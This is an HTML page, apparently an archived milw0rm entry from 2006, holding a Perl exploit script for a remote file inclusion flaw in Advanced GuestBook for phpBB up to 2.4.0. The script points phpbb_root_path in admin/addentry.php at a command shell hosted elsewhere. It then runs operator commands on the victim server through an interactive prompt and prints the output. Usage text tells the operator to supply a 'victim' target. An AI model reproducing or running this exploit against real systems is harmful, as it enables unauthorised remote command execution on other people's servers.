<html><head><title>Advanced GuestBook <= 2.4.0 (phpBB) Remote File Inclusion Exploit</title></head><pre>#!usr/bin/perl
use LWP::UserAgent;
# Bug Found by [Oo]
# Exploit coded by n0m3rcy
# Copyright (c) 2006 n0m3rcy@bsdmail.org
# Gr33tz; nukedx , Devil-00 , str0ke , cijfer
# Usage; n0ag.pl &lt;target&gt; &lt;cmd shell location&gt; &lt;cmd shell variable&gt;
if (@ARGV ne 3) { &amp;usage; }
else { &amp;exploit; }
sub header() {
print &quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n&quot;;
print &quot;+    Advanced GuestBook for phpBB &lt;= 2.4.0 Remote File Inclusion Exploit      +\r\n&quot;;
print &quot;+                             Bug found by [Oo]                               +\r\n&quot;;
print &quot;+                     Copyright (c) 2006 n0m3rcy@bsdmail.org                  +\r\n&quot;;
print &quot;+                  Gr33tz: nukedx , cijfer , str0ke , Devil-00                +\r\n&quot;;
print &quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n&quot;;
}
sub usage() {
  &amp;header;
  print &quot;- Usage: $0 &lt;target&gt; &lt;cmd shell location&gt; &lt;cmd shell variable&gt;\r\n&quot;;
  print &quot;- &lt;target&gt; -&gt; Victim's target ex: www.victim.com/path/\r\n&quot;;
  print &quot;- &lt;cmd shell location&gt; -&gt; www.milw0rm.com/shelltxt\r\n&quot;;
  print &quot;- &lt;cmd shell variable&gt; -&gt; cmd\r\n&quot;;
  exit();
}
sub exploit () {
my $tar = $ARGV[0];
my $cmdt = $ARGV[1];
my $cmdv = $ARGV[2];
while() {
print &quot;[CMD] \$&quot;;
while(&lt;STDIN&gt;) {
$cmd=$_;
chomp($cmd);
my $exp = LWP::UserAgent-&gt;new() or die;
my $go = HTTP::Request-&gt;new(GET =&gt;$tar.' admin/addentry.php?phpbb_root_path='.$cmdt.'?&amp;'.$cmdv.'='.$cmd)or die &quot;\r\n[-] Connected fail\n&quot;;
my $rgo = $exp-&gt;request($go);
my $return = $rgo-&gt;content;
my $return =~ tr/[\n]/[ê]/;
if (!$cmd) { print &quot;\nPlease Enter a Command\n\n&quot;; $return =&quot;&quot;; }
elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in &lt;b&gt;/)
       { print &quot;\nCould Not Connect to cmd Host or Invalid Command Variable\n&quot;;exit }
elsif ($return =~/^&lt;br.\/&gt;.&lt;b&gt;Fatal.error/) { print &quot;\nInvalid Command or No Return\n\n&quot; }
if ($return =~ /(.*)/) {
my $finreturn = $1;
my $finreturn=~ tr/[ê]/[\n]/;
print &quot;\r\n$finreturn\n\r&quot;;
print &quot;[+] Exploit successed\r\n&quot;;
last;
}
else { print &quot;[CMD] \$&quot;; } 
last;
}
exit;
}
}

# milw0rm.com [2006-04-28]</pre></html>